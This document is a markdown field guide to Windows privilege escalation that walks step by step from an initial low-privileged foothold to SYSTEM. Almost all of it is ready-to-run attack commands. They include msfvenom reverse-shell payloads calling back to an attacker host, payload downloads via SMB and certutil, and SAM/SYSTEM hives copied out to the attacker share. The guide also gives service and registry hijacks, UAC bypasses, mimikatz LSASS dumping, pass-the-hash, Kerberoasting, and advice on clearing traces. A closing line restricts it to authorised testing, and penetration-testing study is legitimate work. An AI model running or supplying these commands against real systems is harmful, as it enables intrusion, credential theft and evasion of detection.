# Windows Privilege Escalation — Complete Field Guide

> Assumes initial access has been achieved (e.g. low-privileged shell or RDP session as a standard user).  
> This guide walks through every stage in a logical order — from staging your tools to exhausting every escalation vector.

---

## Table of Contents

1. [Stage Your Tools](#1-stage-your-tools)
2. [Situational Awareness](#2-situational-awareness)
3. [Run Automated Enumeration](#3-run-automated-enumeration)
4. [Service Exploits](#4-service-exploits)
5. [Registry Attacks](#5-registry-attacks)
6. [Credential Hunting](#6-credential-hunting)
7. [Scheduled Tasks](#7-scheduled-tasks)
8. [Startup Locations](#8-startup-locations)
9. [Token Impersonation](#9-token-impersonation)
10. [Kernel Exploits](#10-kernel-exploits)
11. [UAC Bypass](#11-uac-bypass)
12. [DLL Hijacking](#12-dll-hijacking)
13. [AlwaysInstallElevated](#13-alwaysinstallelevated)
14. [Insecure GUI Applications](#14-insecure-gui-applications)
15. [Password Mining](#15-password-mining)
16. [Active Directory Abuse (Local Escalation)](#16-active-directory-abuse-local-escalation)
17. [If Nothing Works](#17-if-nothing-works)
18. [Quick Decision Tree](#18-quick-decision-tree)

---

## 1. Stage Your Tools

Before enumerating anything, get your toolkit onto the target. Do this before running any checks — some techniques require tools to be present in a specific location.

### On Kali — generate payloads and start file server

```bash
# Create working directory
mkdir ~/privesc && cd ~/privesc

# Generate reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe

# Generate reverse shell DLL (for DLL hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o reverse.dll

# Generate reverse shell MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi

# Start SMB share to serve files
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

### On Windows — create staging directory and pull all tools

```cmd
mkdir C:\PrivEsc
cd C:\PrivEsc

REM Pull payloads
copy \\<KALI_IP>\kali\reverse.exe C:\PrivEsc\reverse.exe
copy \\<KALI_IP>\kali\reverse.dll C:\PrivEsc\reverse.dll
copy \\<KALI_IP>\kali\reverse.msi C:\PrivEsc\reverse.msi

REM Pull enumeration tools
copy \\<KALI_IP>\kali\accesschk.exe C:\PrivEsc\accesschk.exe
copy \\<KALI_IP>\kali\winPEASany.exe C:\PrivEsc\winPEASany.exe
copy \\<KALI_IP>\kali\Seatbelt.exe C:\PrivEsc\Seatbelt.exe
copy \\<KALI_IP>\kali\PowerUp.ps1 C:\PrivEsc\PowerUp.ps1
copy \\<KALI_IP>\kali\SharpUp.exe C:\PrivEsc\SharpUp.exe

REM Pull exploit tools
copy \\<KALI_IP>\kali\PrintSpoofer.exe C:\PrivEsc\PrintSpoofer.exe
copy \\<KALI_IP>\kali\RoguePotato.exe C:\PrivEsc\RoguePotato.exe
copy \\<KALI_IP>\kali\GodPotato.exe C:\PrivEsc\GodPotato.exe
copy \\<KALI_IP>\kali\PSExec64.exe C:\PrivEsc\PSExec64.exe
copy \\<KALI_IP>\kali\mimikatz.exe C:\PrivEsc\mimikatz.exe
```

### Tool download sources

| Tool | Source |
|------|--------|
| accesschk.exe | https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk |
| winPEAS | https://github.com/carlospolop/PEASS-ng/releases |
| Seatbelt | https://github.com/GhostPack/Seatbelt |
| PowerUp.ps1 | https://github.com/PowerShellMafia/PowerSploit |
| SharpUp | https://github.com/GhostPack/SharpUp |
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer |
| RoguePotato | https://github.com/antonioCoco/RoguePotato |
| GodPotato | https://github.com/BeichenDream/GodPotato |
| PSExec64 | https://docs.microsoft.com/en-us/sysinternals/downloads/psexec |
| mimikatz | https://github.com/gentilkiwi/mimikatz |

### Start your listener

```bash
# Keep this running in a dedicated terminal throughout the engagement
sudo nc -nvlp 53
```

> **Alternative transfer methods** if SMB is blocked:
> ```bash
> # Python HTTP server
> python3 -m http.server 80
> ```
> ```cmd
> # Download from HTTP server on Windows
> certutil -urlcache -split -f http://<KALI_IP>/reverse.exe C:\PrivEsc\reverse.exe
> powershell -c "Invoke-WebRequest http://<KALI_IP>/reverse.exe -OutFile C:\PrivEsc\reverse.exe"
> ```

---

## 2. Situational Awareness

Before running any automated tools, spend 5 minutes gathering manual context. This shapes everything that follows.

### Who are you?

```cmd
whoami
whoami /priv
whoami /groups
net user <username>
```

**Key things to note:**
- Are you in `Administrators` or `Remote Desktop Users`?
- Do you have `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, or `SeDebugPrivilege`? Any of these are escalation vectors.
- Are you a domain user or local user?

### What is the machine?

```cmd
hostname
systeminfo
systeminfo | findstr /i "os name\|os version\|system type\|hotfix"
wmic qfe list brief        REM list installed patches
```

**Key things to note:**
- OS version and build number — needed for kernel exploit research
- Missing patches — cross reference with known exploits
- Architecture (x64 vs x86) — affects which payloads will work

### What is on the network?

```cmd
ipconfig /all
route print
arp -a
netstat -ano                REM active connections and listening ports
netstat -ano | findstr LISTENING
```

**Key things to note:**
- Internal services listening only on localhost (127.0.0.1) — these are invisible externally but may be exploitable
- Other hosts on the network — potential for lateral movement

### What else is running?

```cmd
tasklist /V
tasklist /SVC              REM services tied to each process
sc query type= all         REM all services
wmic product get name,version,installdate    REM installed software
wmic process get caption,executablepath
```

### What can you access?

```cmd
net share                  REM shared folders
net use                    REM mapped drives
dir /a C:\
dir /a "C:\Program Files\"
dir /a "C:\Program Files (x86)\"
dir /a C:\Users\
icacls C:\Users\           REM check access to other user directories
```

---

## 3. Run Automated Enumeration

Now run the automated tools. These surface misconfigurations much faster than manual checks alone.

```cmd
REM Most comprehensive — run first, output is colour coded
C:\PrivEsc\winPEASany.exe > C:\PrivEsc\winpeas_output.txt

REM Service and path misconfigs — clean PowerShell output
powershell -ep bypass -c ". C:\PrivEsc\PowerUp.ps1; Invoke-AllChecks"

REM Security posture focused
C:\PrivEsc\Seatbelt.exe -group=all > C:\PrivEsc\seatbelt_output.txt

REM Compiled version of PowerUp checks
C:\PrivEsc\SharpUp.exe audit
```

> Pipe output to a file so you can review it without losing scroll history.  
> Work through the output methodically — the sections below map to what these tools will flag.

---

## 4. Service Exploits

Services running as SYSTEM are the most reliable escalation path. Check all four vectors.

### 4a. Insecure service permissions

If you have `SERVICE_CHANGE_CONFIG` on a SYSTEM service, you control what binary it runs.

```cmd
REM Check all services for weak permissions against your user
C:\PrivEsc\accesschk.exe /accepteula -uwcqv <username> *

REM Check a specific service
C:\PrivEsc\accesschk.exe /accepteula -uwcqv <username> <servicename>

REM Confirm it runs as SYSTEM
sc qc <servicename>

REM Redirect binary to reverse shell
sc config <servicename> binpath= "\"C:\PrivEsc\reverse.exe\""

REM Restart the service
net stop <servicename> && net start <servicename>
REM or just:
net start <servicename>
```

### 4b. Unquoted service path

Unquoted paths with spaces make Windows try multiple binary locations in order.

```cmd
REM Find all unquoted paths with spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

REM Check write access on each directory segment
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Example Service\"

REM Plant payload at first writable resolved location
copy C:\PrivEsc\reverse.exe "C:\Program Files\Example.exe"

net start <servicename>
```

**Resolution order for `C:\Program Files\My App\sub dir\service.exe`:**
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\sub.exe      <- check each for write access
C:\Program Files\My App\sub dir\service.exe
```

### 4c. Weak registry permissions

If the service registry key is writable, overwrite `ImagePath`.

```cmd
REM Check registry key permissions
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<servicename>

REM Overwrite ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\services\<servicename> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

net start <servicename>
```

### 4d. Writable service binary

When the binary itself is writable, replace it directly.

```cmd
REM Check binary file permissions
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Path\To\service.exe"

REM Also check with icacls
icacls "C:\Path\To\service.exe"

REM Replace binary
copy C:\PrivEsc\reverse.exe "C:\Path\To\service.exe" /Y

net start <servicename>
```

---

## 5. Registry Attacks

### 5a. AutoRun binary hijack

Executables listed in AutoRun keys fire at every user logon. Writable binaries let you intercept any privileged logon.

```cmd
REM Check all AutoRun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run

REM Check write access on any listed binary
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Path\To\autorun.exe"

REM Replace with reverse shell
copy C:\PrivEsc\reverse.exe "C:\Path\To\autorun.exe" /Y

REM Trigger — open new RDP session or wait for admin logon
rdesktop <TARGET_IP>
```

### 5b. AlwaysInstallElevated

When both keys are `1`, any `.msi` runs as SYSTEM.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f msi -o reverse.msi
```

```cmd
copy \\<KALI_IP>\kali\reverse.msi C:\PrivEsc\reverse.msi
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

---

## 6. Credential Hunting

Credentials found anywhere can be used to authenticate as a more privileged account.

### 6a. Registry — AutoLogon and cached passwords

```cmd
REM AutoLogon plaintext credentials
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

REM Broad password search across registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

REM VNC stored passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

REM PuTTY stored sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### 6b. Saved credentials (Windows Credential Manager)

```cmd
cmdkey /list
runas /savecred /user:<domain>\<username> C:\PrivEsc\reverse.exe
```

### 6c. SAM and SYSTEM database

```cmd
REM Check for insecure backups
dir C:\Windows\Repair\SAM
dir C:\Windows\Repair\SYSTEM
dir C:\Windows\System32\config\RegBack\

REM Transfer to Kali
copy C:\Windows\Repair\SAM \\<KALI_IP>\kali\
copy C:\Windows\Repair\SYSTEM \\<KALI_IP>\kali\
```

```bash
git clone https://github.com/Tib3rius/creddump7
pip3 install pycrypto
python3 creddump7/pwdump.py SYSTEM SAM
hashcat -m 1000 --force <HASH> /usr/share/wordlists/rockyou.txt
```

### 6d. Pass the Hash

```bash
pth-winexe -U '<domain>\<user>%<LM:NTLM>' //<TARGET_IP> cmd.exe
impacket-psexec <user>@<TARGET_IP> -hashes <LM:NTLM>
impacket-wmiexec <user>@<TARGET_IP> -hashes <LM:NTLM>
crackmapexec smb <TARGET_IP> -u <user> -H <NTLM> -x whoami
```

### 6e. Plaintext passwords in files

```cmd
REM Search common locations
dir /s /b C:\*.txt 2>nul | findstr /i "pass\|cred\|secret\|config"
dir /s /b C:\*.xml 2>nul | findstr /i "pass\|cred"
dir /s /b C:\*.ini 2>nul | findstr /i "pass\|cred"
dir /s /b C:\*.config 2>nul | findstr /i "pass\|cred"

REM Unattended install files often contain admin credentials
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep.inf

REM IIS web config
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

REM Search file contents recursively (slow but thorough)
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config
```

### 6f. Mimikatz — dump credentials from memory

> Requires SYSTEM or SeDebugPrivilege. Best used after escalating.

```cmd
C:\PrivEsc\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords        REM dump plaintext passwords and hashes from LSASS
lsadump::sam                    REM dump SAM hashes
lsadump::secrets                REM dump LSA secrets
vault::cred                     REM dump Windows Vault credentials
exit
```

### 6g. PowerShell history and transcripts

```cmd
REM PowerShell command history
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

REM Check all user profiles for history files
dir /s /b C:\Users\*ConsoleHost_history.txt

REM PowerShell transcripts (if logging is enabled)
dir /s /b C:\Users\*transcript*.txt
dir /s /b C:\*transcript*.txt
```

### 6h. SSH keys and configuration files

```cmd
dir /s /b C:\Users\*id_rsa* 2>nul
dir /s /b C:\Users\*.pem 2>nul
dir /s /b C:\Users\*known_hosts* 2>nul
dir /s /b C:\Users\.ssh\ 2>nul
```

---

## 7. Scheduled Tasks

Tasks running as SYSTEM with writable scripts or binaries are reliable escalation vectors.

```cmd
REM List all scheduled tasks with run-as user and command
schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run\|status"

REM Shorter overview
schtasks /query /fo TABLE /nh

REM Check write access on any script or binary a task executes
C:\PrivEsc\accesschk.exe /accepteula -quvw user "C:\Path\To\script.ps1"
icacls "C:\Path\To\script.ps1"

REM If writable, append reverse shell
echo C:\PrivEsc\reverse.exe >> "C:\Path\To\script.ps1"

REM Wait for the next scheduled run — or force it if you have permission
schtasks /run /tn "<TaskName>"
```

> Also check the directory the task script lives in — if the directory is writable you may be able to replace or add files even if the script itself isn't.

---

## 8. Startup Locations

Multiple locations cause programs to run at logon. Check them all.

```cmd
REM Global startup folder — fires for all users
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

REM Per-user startup folder
C:\PrivEsc\accesschk.exe /accepteula -d "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM If writable, drop a shortcut or executable
copy C:\PrivEsc\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.exe"

REM Trigger by simulating admin logon
rdesktop -u admin <TARGET_IP>
```

---

## 9. Token Impersonation

If you land on a service account (IIS, MSSQL, network service) check for impersonation privileges immediately.

```cmd
whoami /priv
```

**Dangerous privileges to look for:**

| Privilege | Exploit path |
|-----------|-------------|
| SeImpersonatePrivilege | PrintSpoofer, Potato attacks |
| SeAssignPrimaryTokenPrivilege | Potato attacks |
| SeBackupPrivilege | Read any file including SAM/SYSTEM |
| SeRestorePrivilege | Write any file, replace service binaries |
| SeTakeOwnershipPrivilege | Take ownership of any file or registry key |
| SeDebugPrivilege | Inject into or dump LSASS |
| SeLoadDriverPrivilege | Load a malicious kernel driver |

### PrintSpoofer

```cmd
REM Check Spooler is running
sc query spooler

C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

### GodPotato (recommended for modern Windows)

```cmd
C:\PrivEsc\GodPotato.exe -cmd "C:\PrivEsc\reverse.exe"
```

### RoguePotato

```bash
REM Kali — set up redirector first
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999
```

```cmd
C:\PrivEsc\RoguePotato.exe -r <KALI_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
```

### Choosing the right Potato

| Tool | Windows version | Notes |
|------|----------------|-------|
| GodPotato | Win 10/11, Server 2019/2022 | Best modern option |
| PrintSpoofer | Win 10, Server 2016/2019 | Requires Print Spooler running |
| RoguePotato | Win 10, Server 2016/2019 | Needs socat redirector |
| SweetPotato | Win 10, Server 2016/2019 | Combines multiple methods |
| JuicyPotato | Pre-Server 2019 | Needs specific CLSID per OS version |
| HotPotato | Win 7/8/early Win 10 | NBNS/WPAD spoofing |

### SeBackupPrivilege abuse

```cmd
REM Use backup privilege to copy SAM and SYSTEM without standard read access
reg save HKLM\SAM C:\PrivEsc\SAM
reg save HKLM\SYSTEM C:\PrivEsc\SYSTEM

copy C:\PrivEsc\SAM \\<KALI_IP>\kali\
copy C:\PrivEsc\SYSTEM \\<KALI_IP>\kali\
```

### SeTakeOwnershipPrivilege abuse

```cmd
REM Take ownership of a SYSTEM-run binary and replace it
takeown /f "C:\Windows\System32\<target>.exe"
icacls "C:\Windows\System32\<target>.exe" /grant <username>:F
copy C:\PrivEsc\reverse.exe "C:\Windows\System32\<target>.exe" /Y
```

---

## 10. Kernel Exploits

Use as a last resort — kernel exploits can crash the system and are noisy.

```cmd
REM Get OS version and patch level
systeminfo
wmic qfe list brief | sort

REM Check architecture
wmic os get osarchitecture
```

```bash
# Cross reference missing patches with known exploits (Kali)
python3 windows-exploit-suggester.py --update
python3 windows-exploit-suggester.py --database <date>-mssb.xls --systeminfo <systeminfo_output.txt>

# Or use the online tool
# https://github.com/bitsadmin/wesng
python3 wes.py systeminfo.txt -i "Elevation of Privilege"
```

**Notable Windows kernel exploits by version:**

| CVE | Name | Affected versions |
|-----|------|------------------|
| CVE-2021-1675 | PrintNightmare | Windows 10/11, Server 2019 |
| CVE-2020-0796 | SMBGhost | Windows 10 1903/1909 |
| CVE-2019-0708 | BlueKeep | Windows 7, Server 2008 |
| CVE-2017-0144 | EternalBlue (MS17-010) | Windows 7, Server 2008 R2 |
| CVE-2016-3225 | MS16-075 (Hot Potato) | Windows 7-10, Server 2008-2012 |
| CVE-2015-1701 | MS15-051 | Windows 7, Server 2003-2008 |
| CVE-2014-4113 | MS14-058 | Windows 7/8, Server 2003-2012 |

---

## 11. UAC Bypass

If `whoami /groups` shows `Mandatory Label\Medium Mandatory Level` but you are in the Administrators group, UAC is blocking full access. Bypass it to reach high integrity.

```cmd
REM Check current integrity level
whoami /groups | findstr /i "mandatory label\|administrators"
```

### Method 1 — fodhelper.exe (Windows 10)

```cmd
REM fodhelper reads a registry key and opens it with auto-elevation
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\PrivEsc\reverse.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
```

### Method 2 — eventvwr.exe (Windows 7-10)

```cmd
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "C:\PrivEsc\reverse.exe" /f
eventvwr.exe
```

### Method 3 — UACMe (automated, many techniques)

```bash
# https://github.com/hfiref0x/UACME
# Key 23 works on most Windows 10 versions
Akagi64.exe 23 C:\PrivEsc\reverse.exe
```

> Clean up registry keys after UAC bypass to avoid leaving traces:
> ```cmd
> reg delete HKCU\Software\Classes\ms-settings /f
> ```

---

## 12. DLL Hijacking

When a privileged process loads a DLL that either doesn't exist or loads from a writable directory, plant a malicious replacement.

### Find missing DLLs with Process Monitor

1. Run `procmon.exe` on the target
2. Filter: `Path ends with .dll` AND `Result is NAME NOT FOUND`
3. Look for DLLs being searched for in writable directories

```cmd
REM Check write access on the directory where the DLL is being searched
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Some\Writable\Path\"
icacls "C:\Some\Writable\Path\"
```

```bash
# Generate malicious DLL (Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o hijack.dll
```

```cmd
REM Place DLL with the expected name
copy C:\PrivEsc\reverse.dll "C:\Some\Writable\Path\missing.dll"

REM Restart the service or wait for the process to restart
net stop <servicename> && net start <servicename>
```

### PATH DLL hijacking

```cmd
REM Check directories on the system PATH for write access
echo %PATH%
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Some\Path\Dir\"

REM If writable, a DLL searched for along PATH can be planted there
```

---

## 13. AlwaysInstallElevated

Covered in [Registry Attacks — section 5b](#5b-alwaysinstallelevated).

---

## 14. Insecure GUI Applications

When an elevated GUI app is accessible over RDP, its file dialogs run in the same security context.

```cmd
REM Find GUI apps running as admin
tasklist /V | findstr /v "N/A"
```

In the app: `File > Open` → click the address bar → paste and press Enter:

```
file://c:/windows/system32/cmd.exe
```

> Works with any GUI app that has a file open dialog — Paint, Notepad, WordPad, etc.

---

## 15. Password Mining

Covered in detail under [Credential Hunting — section 6](#6-credential-hunting). Additional locations:

```cmd
REM Browser stored credentials
dir /s /b "C:\Users\*Login Data*" 2>nul
dir /s /b "C:\Users\*logins.json*" 2>nul

REM Git configuration
dir /s /b C:\Users\*.gitconfig 2>nul
type C:\Users\<user>\.gitconfig

REM Database connection strings
dir /s /b C:\*.udl 2>nul
findstr /si "connectionstring\|data source\|password" C:\*.config

REM Environment variables
set

REM Windows Credential Manager (GUI)
rundll32.exe keymgr.dll KRShowKeyMgr

REM Windows Credential Manager (CLI)
vaultcmd /listcreds:"Windows Credentials"
vaultcmd /listcreds:"Web Credentials"
```

---

## 16. Active Directory Abuse (Local Escalation)

If the machine is domain-joined, AD misconfigurations can provide local escalation paths.

```cmd
REM Check if domain joined
systeminfo | findstr /i "domain"
wmic computersystem get domain

REM List domain admins
net group "Domain Admins" /domain

REM Check for Kerberoastable accounts (SPNs)
setspn -T <domain> -Q */*

REM Check for AS-REP roastable accounts
```

```bash
# Kerberoasting — request TGS tickets and crack offline (Kali)
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request

# AS-REP roasting — accounts with no pre-auth required
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP>

# Crack captured hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```cmd
REM Check for GPP (Group Policy Preferences) credentials
findstr /si "cpassword" C:\Windows\SYSVOL\*.xml
findstr /si "cpassword" C:\Windows\SYSVOL\*.inf
```

---

## 17. If Nothing Works

Exhaust these final checks before giving up.

```cmd
REM World-writable directories in Program Files
C:\PrivEsc\accesschk.exe /accepteula -uwdqs "Everyone" "C:\Program Files\"
C:\PrivEsc\accesschk.exe /accepteula -uwdqs "BUILTIN\Users" "C:\Program Files\"

REM World-writable files anywhere on the system
C:\PrivEsc\accesschk.exe /accepteula -uwqs "Everyone" C:\*.*
C:\PrivEsc\accesschk.exe /accepteula -uwqs "BUILTIN\Users" C:\*.*

REM Check if you can write to any directory in PATH
for %A in ("%path:;=";"%") do ( C:\PrivEsc\accesschk.exe /accepteula -uwdq %A )

REM Installed applications with known vulnerabilities
wmic product get name,version

REM Check for third-party AV or security products that may have escalation paths
sc query | findstr /i "service_name" | findstr /i /v "microsoft\|windows"

REM Network shares with sensitive content
net view \\<TARGET_IP>
dir \\<TARGET_IP>\<sharename>\

REM Environment variable abuse — check for writable locations in PATH
echo %PATH%
echo %TEMP%
echo %TMP%
```

---

## 18. Quick Decision Tree

```
Initial access achieved
│
├── Run situational awareness checks (whoami /priv, systeminfo)
│   │
│   ├── SeImpersonatePrivilege present?
│   │   └── YES → Token impersonation (PrintSpoofer / GodPotato)
│   │
│   ├── Medium integrity admin?
│   │   └── YES → UAC bypass
│   │
│   └── SeBackupPrivilege present?
│       └── YES → Dump SAM/SYSTEM directly
│
├── Run automated tools (winPEAS, PowerUp, SharpUp)
│
├── Check services
│   ├── Weak service ACL?          → sc config binpath attack
│   ├── Unquoted path?             → plant binary at resolved path
│   ├── Weak registry key ACL?     → overwrite ImagePath
│   └── Writable service binary?   → replace the exe directly
│
├── Check registry
│   ├── AutoRun binaries writable? → replace and wait for logon
│   └── AlwaysInstallElevated?     → msiexec SYSTEM shell
│
├── Hunt credentials
│   ├── Registry (winlogon, VNC, PuTTY)
│   ├── Unattended install files
│   ├── SAM/SYSTEM backups
│   ├── PowerShell history
│   ├── Config and web files
│   └── Credential Manager (cmdkey)
│
├── Scheduled tasks — writable scripts run as SYSTEM?
│
├── Startup folder — writable by current user?
│
├── DLL hijacking — NAME NOT FOUND in writable path?
│
├── Kernel exploits — old OS, missing patches?
│
├── Domain joined?
│   ├── Kerberoasting
│   ├── AS-REP roasting
│   └── GPP credentials
│
└── Nothing found → world-writable file/directory sweep
```

---

## Appendix — Essential Commands Summary

```cmd
REM === Identity ===
whoami /all
net user %username%

REM === System ===
systeminfo | findstr /i "os\|hotfix\|domain"
wmic qfe list brief

REM === Network ===
netstat -ano | findstr LISTENING
ipconfig /all

REM === Services ===
sc query type= all state= all
wmic service get name,pathname,startmode,startname

REM === Scheduled tasks ===
schtasks /query /fo LIST /v

REM === AutoRun ===
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

REM === AlwaysInstallElevated ===
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM === Credential locations ===
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list
dir C:\Windows\Repair\SAM

REM === File hunting ===
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config
dir /s /b C:\Windows\Panther\Unattend*.xml
```

---

*For educational and authorised penetration testing use only.*
